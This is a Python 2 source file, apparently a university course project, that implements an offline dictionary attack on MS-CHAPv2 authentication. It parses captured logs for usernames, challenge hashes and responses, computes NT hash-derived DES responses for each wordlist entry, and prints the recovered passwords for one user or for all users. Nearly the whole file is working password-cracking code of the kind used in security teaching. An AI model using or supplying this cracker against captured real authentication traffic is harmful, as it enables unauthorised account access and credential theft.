"""
Author: Ryan Lutz and Zachary Page
This Code Complies with the JMU honor code 
"""

from Crypto.Cipher import DES
from Crypto.Hash import MD4
from bitstring import BitArray
import sys
import binascii
import codecs

# ----------------------- HELPER METHODS ----------------------- #

def findPassword(CCH16, CCR24):

	# Prepare arguments for processing
	CCH16 = HexToByte(CCH16)
	CCR24 = CCR24.replace(':', ' ')
	CCR24 = CCR24.upper()
	timer = 0
	print "\n--< This may take a while..."
	print "--< Each dot below represents 10,000 attempted passwords."
	print "\n--< Cracking",
		
	for guess in dictionary:

		# Track/display timer
		timer += 1
		if timer%10000 == 0:
			print ".",
		
		# Create nt_hash for this guess using MD4 hashing algorithm.
		guess = guess.strip()					# Remove newline ('\n')
		uGuess = guess.encode('utf-16-le')		# Convert to utf-16le
		nt_hash = MD4.new(uGuess).hexdigest()
		
		# Split nt_hash into three DES keys.
		# Add the parity bits to the DES keys to make them 8-bytes each.
		des_key_1 = HexToByte(addParity(nt_hash[0:14]))
		des_key_2 = HexToByte(addParity(nt_hash[14:28]))
		des_key_3 = HexToByte(addParity(nt_hash[28:] + "0000000000"))

		# Create DES encryption objects with keys.
		des_1 = DES.new(des_key_1, DES.MODE_ECB)
		des_2 = DES.new(des_key_2, DES.MODE_ECB)
		des_3 = DES.new(des_key_3, DES.MODE_ECB)
		
		# Calculate 24-byte Client Challenge Response for this guess 
		# with the DES objects and the 16-byte Client Challenge Hash.
		ccr24_part1 = des_1.encrypt(CCH16)
		ccr24_part2 = des_2.encrypt(CCH16)
		ccr24_part3 = des_3.encrypt(CCH16)
		ccr24_guess = ByteToHex(ccr24_part1 + ccr24_part2 + ccr24_part3)
		#print "   ccr24 --> ", ccr24_guess  #DEBUG
		#print "CCR24 -----> ", CCR24, "\n"  #DEBUG
		
		# Compare the guess (ccr24_guess) with the original (CCR24).
		if ccr24_guess == CCR24:
			return guess
	
	# If no password found, return None
	return "FAILED - dictionary exhausted..."

def addParity(key):
	"""
	Convert a 7-byte key into an 8-byte key by adding
	odd-parity bits at the end of each byte.
	"""
	
	key = "0x" + key
	bin_key = BitArray(key)
	new_key = BitArray()
	new_key.append(odd_parity(bin_key[:7]))
	new_key.append(odd_parity(bin_key[7:14]))
	new_key.append(odd_parity(bin_key[14:21]))
	new_key.append(odd_parity(bin_key[21:28]))
	new_key.append(odd_parity(bin_key[28:35]))
	new_key.append(odd_parity(bin_key[35:42]))
	new_key.append(odd_parity(bin_key[42:49]))
	new_key.append(odd_parity(bin_key[49:]))
	return new_key.hex

def odd_parity(bit_array):
	"""
	Parameter:
	bit_array  -  BitArray object
	
	Returns:
	bit_array  -  Input parameter with odd-parity bit added.
	              BitArray object
	"""
	num_set_bits = 0
	for bit in bit_array:
		if bit == True:
			num_set_bits += 1
	if num_set_bits % 2 == 1:
		bit_array.append('0b0')
	else:
		bit_array.append('0b1')	
	return bit_array

def isNumber(string):
	if string == "":
		return False
	try:
		float(string)
		return True
	except ValueError:
		return False	

"""
The following two methods, "HexToByte" and "ByteToHex," were written
by Simon Peverett and can be found at:

http://code.activestate.com/recipes/510399-byte-to-hex-and-hex-to-byte-string-conversion/
"""
	
def HexToByte(hexStr):
	"""
	Convert a string of hex byte values into a byte string. The hex byte
	values may or may not be colon separated.
	"""
	bytes = []
	hexStr = ''.join(hexStr.split(":"))
	for i in range(0, len(hexStr), 2):
		bytes.append(chr(int(hexStr[i:i+2], 16 )))
	return ''.join( bytes )

def ByteToHex(byteStr):
	"""
	Convert a byte string to it's hex string representation e.g. for output.
	"""
	return ''.join( [ "%02X " % ord( x ) for x in byteStr ] ).strip()

	
# ------------------- BEGIN MSCHAPv2_cracker ------------------- #

# Load the log file specified on the command line.
file_name = sys.argv[1]
f = codecs.open(file_name, "r", "utf-8")
log = list(f)
f.close()

# Load the dictionary file specified on the command line.
file_name = sys.argv[2]
f = open(file_name)
dictionary = list(f)
f.close()

# Extract the 24-byte Client Challenge Response (CCR24) and the
# 16-byte Client Challenge Hash (CCH16) from each record in the
# log file.
numLogEntries = (len(log)+2)/6
userlist = []
CCH16list = []
CCR24list = []
currentLine = 0
for i in range(numLogEntries):
	currentLine += 2
	userlist.append(log[currentLine][11:].strip())
	currentLine += 1
	CCH16list.append(log[currentLine][12:].strip())
	currentLine += 1
	CCR24list.append(log[currentLine][11:].strip())
	currentLine += 2

# Display the usernames found and ask the user to either choose
# one to crack or choose to crack all of them.
print "\n--< Authentication records were found for the following users:\n"
print "   REC#  USERNAME"
print "   ----  -----------------------------------------------"
for i in range(numLogEntries):
	print "  ", repr(i+1).rjust(4), "", userlist[i]

valid_choice = False
while not valid_choice:
	choice = ""
	print "\n--< Enter the REC# you would like to crack,"
	choice = raw_input("--< or just press <ENTER> to crack all of them:  ")
	if isNumber(choice):
		choice = int(choice)-1
		if choice not in range(numLogEntries):
			print "\nERROR: You must choose a valid REC# [",
			print 1, "...", numLogEntries, "]"
		else:  # valid choice
			valid_choice = True
	else:  # crack all
		choice = "ALL"
		valid_choice = True

pwordlist = []
if choice == "ALL":
	for i in range(numLogEntries):
		pwordlist.append(findPassword(CCH16list[i], CCR24list[i]))
else:  # one entry was chosen
	pword = findPassword(CCH16list[choice], CCR24list[choice])
		
# Display results of crack		
print "\n--< Results of crack...\n"
print "   REC#  USERNAME                     PASSWORD"
print "   ----  ---------------------------  ---------------------------"
if pwordlist:	
	for i in range(numLogEntries):
		print "  ", repr(i+1).rjust(4), "", userlist[i].ljust(26), " ", pwordlist[i].ljust(26)
else:  # one entry was cracked
	print "  ", repr(choice+1).rjust(4), "", userlist[choice].ljust(26), " ", pword.ljust(26)
	
# -------------------- END MSCHAPv2_cracker -------------------- #